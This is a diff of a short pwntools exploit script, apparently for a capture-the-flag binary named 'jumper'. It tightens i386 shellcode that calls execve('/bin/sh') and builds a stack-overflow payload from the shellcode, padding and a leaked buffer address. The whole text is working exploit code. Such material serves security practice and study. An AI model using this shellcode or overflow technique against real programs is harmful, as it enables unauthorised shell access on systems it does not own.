@@ -3,30 +3,24 @@ from pwn import *
 p = process("./jumper")
 
 shellcode = asm('''
-    /* argv = envp = NULL */
+    mov eax, 0xb
     xor edx, edx
     xor ecx, ecx
 
-    /* push '/bin/sh' onto stack */
-    push 0x68
-    push 0x732f2f2f
+    push 0x68732f2f
     push 0x6e69622f
     mov ebx, esp
 
-    /* call execve() */
-    mov eax, 0xb /* Syscall Number 11 */
-    int 0x80  /* Trigger syscall */
+    int 0x80
 ''')
 
 print(len(shellcode))
 
 p.recvuntil("&input=")
-buffer = int(p.recvline().strip().decode('utf-8'), 16)
+buffer = int(p.recvline().strip(), 16)
 
-print(hex(buffer))
-
-exploit = b"\x90" * 3
 exploit = shellcode
+exploit += b"A" * 5
 exploit += p32(buffer)
 
 p.sendlineafter("Hello\n", exploit)
